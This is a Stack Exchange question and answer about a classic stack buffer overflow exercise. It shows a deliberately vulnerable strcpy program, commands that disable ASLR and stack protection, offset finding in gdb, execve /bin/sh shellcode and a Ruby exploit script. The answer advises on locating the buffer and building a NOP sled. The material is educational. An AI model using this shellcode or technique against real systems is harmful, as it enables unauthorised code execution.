{
    "title": "A buffer overflow exercise using a shellcode",
    "link": "https://reverseengineering.stackexchange.com/questions/15798/a-buffer-overflow-exercise-using-a-shellcode",
    "content": "<div class=\"s-prose js-post-body\" itemprop=\"text\">\n<p>I have been doing an exercise about a buffer overload on a C program, the goal of this problem is to <strong>get the root shell</strong> once I have inserted a <strong>shellcode</strong> into the program. This is what I have until now:</p>\n<p><strong>STEP 1.- Firstable let´s see my C code in the file called file.c :</strong></p>\n<pre><code>root@kali:~# cat ./file.c\n#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nvoid premio()\n{\n     printf(\"I have altered the programs flow\\n\");\n}\n\nint main(int argc, char *argv[])\n{\n    char buffer[100];\n    if (argc != 2)\n   {\n         printf(\"Use: %s argument\\n\",argv[0]);\n         return -1;\n    }\n    strcpy(buffer,argv[1]);\n    printf (\"%s\\n\",buffer);\n    return 0;\n}\n</code></pre>\n<p><strong>STEP 2.- I have compilled it and deactivate the ASLR to avoid receiving random addresses as follows:</strong></p>\n<pre><code>gcc -fno-stack-protector -z execstack buffer.c -o buffer\n\necho 0 &gt; /proc/sys/kernel/randomize_va_space\n</code></pre>\n<p><strong>STEP 3.- Let´s check how it works :</strong></p>\n<pre><code>root@kali:~# ./file string\nstring\nroot@kali:~# ./file `ruby -e 'print \"a\"*99'`\naaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\nroot@kali:~# ./file `ruby -e 'print \"a\"*100'`\naaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\nroot@kali:~# ./file `ruby -e 'print \"a\"*125'`\naaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\nSegmentation fault  (this means we have overwritten the EIP register)\n\nroot@kali:~# gdb ./file\n(gdb) run  `ruby -e 'print \"a\"*125'`\nStarting program: /root/file `ruby -e 'print \"a\"*125'`\naaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n\nProgram received signal SIGSEGV, Segmentation fault.\n0x0000006161616161 in ?? () (this is the value of EIP beacuse of the letter a)\n(gdb) \n</code></pre>\n<p><strong>STEP 4.- We will find the value of the position of EIP using :</strong></p>\n<pre><code>root@kali:~# ./pattern_create.rb -l 125\nAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae\nroot@kali:~# gdb ./file\n(gdb) run \"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae\"\nStarting program: /root/file \"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae\"\nAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae\n\nProgram received signal SIGSEGV, Segmentation fault.\n0x0000006541306541 in ?? ()\n\nroot@kali:~# ./pattern_offset.rb -q 0x0000006541306541 -l 125\n[*] Exact match at offset 120\n\nIn this case we have found that if we write 120 characters the next 5 will be EIP\n</code></pre>\n<p><strong>STEP 5.- -Now we will create a script to overwrite the buffer with the shellcode, the shellcode was taken from :</strong></p>\n<pre><code>\\x31 \\xc0                   xor eax, eax\n\\x50                        push eax\n//PUSH /bin\n\\x68\\x2f\\x2f\\x73\\x68        push 0x68732f2f\n//PUSH //sh\n\\x68\\x2f\\x62\\x69\\x6e        push 0x6e69622f\n\\x89\\xe3                    mov ebx, esp\n\\x50                        push eax\n\\x53                        push ebx\n\\x89\\xe1                    mov ecx, esp\n\\xb0\\x0b                    mov al, 0xb\n\\xcd\\x80                    int 0x80  \n\nroot@kali:~# cat ./exploit.rb\neip = \"bbbbb\"\naes = \"a\"*97\nshell = \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\" #23 bytes\n\nprint (shell + aes + eip) #125 bytes total\n</code></pre>\n<p><strong>STEP 6.- Now we must know what address must jump to begin to execute our shell, but here I am stuck because I do not know how to do.</strong></p>\n<pre><code>(gdb) set disassembly-flavor intel\n(gdb) disass main\nDump of assembler code for function main:\n   0x0000000000000753 &lt;+0&gt;:     push   rbp\n   0x0000000000000754 &lt;+1&gt;:     mov    rbp,rsp\n   0x0000000000000757 &lt;+4&gt;:     add    rsp,0xffffffffffffff80\n   0x000000000000075b &lt;+8&gt;:     mov    DWORD PTR [rbp-0x74],edi\n   0x000000000000075e &lt;+11&gt;:    mov    QWORD PTR [rbp-0x80],rsi\n   0x0000000000000762 &lt;+15&gt;:    cmp    DWORD PTR [rbp-0x74],0x2\n   0x0000000000000766 &lt;+19&gt;:    je     0x78a &lt;main+55&gt;\n   0x0000000000000768 &lt;+21&gt;:    mov    rax,QWORD PTR [rbp-0x80]\n   0x000000000000076c &lt;+25&gt;:    mov    rax,QWORD PTR [rax]\n   0x000000000000076f &lt;+28&gt;:    mov    rsi,rax\n   0x0000000000000772 &lt;+31&gt;:    lea    rdi,[rip+0xf1]        # 0x86a\n   0x0000000000000779 &lt;+38&gt;:    mov    eax,0x0\n   0x000000000000077e &lt;+43&gt;:    call   0x5f0 &lt;printf@plt&gt;\n   0x0000000000000783 &lt;+48&gt;:    mov    eax,0xffffffff\n   0x0000000000000788 &lt;+53&gt;:    jmp    0x7b5 &lt;main+98&gt;\n   0x000000000000078a &lt;+55&gt;:    mov    rax,QWORD PTR [rbp-0x80]\n   0x000000000000078e &lt;+59&gt;:    add    rax,0x8\n   0x0000000000000792 &lt;+63&gt;:    mov    rdx,QWORD PTR [rax]\n   0x0000000000000795 &lt;+66&gt;:    lea    rax,[rbp-0x70]\n   0x0000000000000799 &lt;+70&gt;:    mov    rsi,rdx\n   0x000000000000079c &lt;+73&gt;:    mov    rdi,rax\n   0x000000000000079f &lt;+76&gt;:    call   0x5d0 &lt;strcpy@plt&gt;\n   0x00000000000007a4 &lt;+81&gt;:    lea    rax,[rbp-0x70]\n   0x00000000000007a8 &lt;+85&gt;:    mov    rdi,rax\n   0x00000000000007ab &lt;+88&gt;:    call   0x5e0 &lt;puts@plt&gt;\n   0x00000000000007b0 &lt;+93&gt;:    mov    eax,0x0\n   0x00000000000007b5 &lt;+98&gt;:    leave\n   0x00000000000007b6 &lt;+99&gt;:    ret\nEnd of assembler dump.\n</code></pre>\n<p><strong>STEP 7.- Here is suppose to find the address to put it into the exploit script changing the value of eip but I don`t know what to do neither, sorry</strong></p>\n<pre><code>(gdb) run `ruby exploit.rb`\nStarting program: /root/file `ruby exploit.rb`\n1▒Ph//shh/bin▒▒PS▒▒\n                   ̀aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbb\n\nProgram received signal SIGSEGV, Segmentation fault.\n0x0000006262626262 in ?? ()\n(gdb) x/40x $esp\n0xffffffffffffe590:     Cannot access memory at address 0xffffffffffffe590\n(gdb) x/40x $rsp\n0x7fffffffe590: 0x00600000      0x00000000      0xffffe668      0x00007fff\n0x7fffffffe5a0: 0xf7b9c168      0x00000002      0x55554753      0x00005555\n0x7fffffffe5b0: 0x00000000      0x00000000      0xb3c231f4      0x54cfb08e\n0x7fffffffe5c0: 0x55554610      0x00005555      0xffffe660      0x00007fff\n0x7fffffffe5d0: 0x00000000      0x00000000      0x00000000      0x00000000\n0x7fffffffe5e0: 0xf76231f4      0x019ae5db      0x589031f4      0x019af56f\n0x7fffffffe5f0: 0x00000000      0x00000000      0x00000000      0x00000000\n0x7fffffffe600: 0x00000000      0x00000000      0xffffe680      0x00007fff\n0x7fffffffe610: 0xf7ffe168      0x00007fff      0xf7de875b      0x00007fff\n0x7fffffffe620: 0x00000000      0x00000000      0x00000000      0x00000000\n(gdb)\n</code></pre>\n<p>At the end of all it must give me a root shell.</p>\n<p>Almost to finish, on steps 6 and 7 I am really stuck, can you help me please?</p>\n</div>",
    "votes": "2",
    "answers": 1,
    "views": "7k",
    "tags": [
        "buffer-overflow",
        "shellcode"
    ],
    "user": "Mr. J",
    "time": "Jul 10, 2017 at 16:44",
    "comments": [],
    "answers_data": [
        {
            "content": "<div class=\"s-prose js-post-body\" itemprop=\"text\">\n<p>Okay, so I will try to answer to all your questions and add a few remarks.</p>\n<ol>\n<li><p><strong>Do not disable ASLR system-wide, prefer to disable it within the current process</strong>. </p>\n<p>In fact, echoing <code>0</code> in <code>randomize_va_space</code> will totally shutdown the ASLR for your whole system leaving it vulnerable to external attack. If you are under Linux, the best way to disable locally the ASLR is to use the process personality flags like this:</p>\n<pre><code>$&gt; setarch $(uname -m) -R /bin/bash\n</code></pre>\n<p>This command will start a new <code>bash</code> process (encapsulated in the first one... think about the Inception movie) which will disable the ASLR. The good thing is that you do not need to be <code>root</code> to run this command. The bad thing is that if you are running a setuid program, then the personality will be discarded (to avoid an obvious security risk).</p>\n<p>Finally, you can note that if you are just experimenting a buffer-overflow exploitation for the first time, then <code>gdb</code> is disabling the ASLR for you and, for educational purpose, it might be enough to make it work within <code>gdb</code>.</p>\n<p>Also, try to avoid running these kind of things as <code>root</code>, this is extremely risky... I cannot help but telling you to do it as a simple user.</p></li>\n<li><p><strong>Where is my mind^Wshellcode ?</strong></p>\n<p>Well, your shellcode is exactly located at your buffer address. You can simply compile your vulnerable program with the debug option (<code>-g</code>) and then ask gdb to tell you where it is:</p>\n<pre><code>(gdb) print &amp;buffer\n</code></pre></li>\n<li><p><strong>NOP-sled your injection to make the exploit more reliable!</strong></p>\n<p>Note that you wrote a bunch of <code>a</code>s as padding between the shellcode and the overwrite of the <code>saved eip</code>, but we usually use this space <strong>before</strong> the shellcode and fill it with NOPs (<code>0x90</code>) to build a NOP sled. This technique help to increase the chances to reach the shellcode and execute it (even if you are not very precise at guessing the address of <code>buffer</code>, you may land in the NOP-sled and follow it to the shellcode). At the end, you should have something like: </p>\n<pre><code>[NOP-sled + shellcode + return-address]\n</code></pre></li>\n<li><p><strong>Use the Force^Wdebugger, Luke!</strong></p>\n<p>Do not hesitate to step the program at the assembly level by doing <code>ni</code> (next-instruction) and <code>si</code> (step-instruction) and follow what happen. This is extremely helpful to debug and understand what happen.</p></li>\n</ol>\n<p>Hope this helped you a bit...</p>\n</div>",
            "votes": "4",
            "user": "perror",
            "time": "Jul 10, 2017 at 16:33",
            "is_accepted": false,
            "comments": []
        }
    ]
}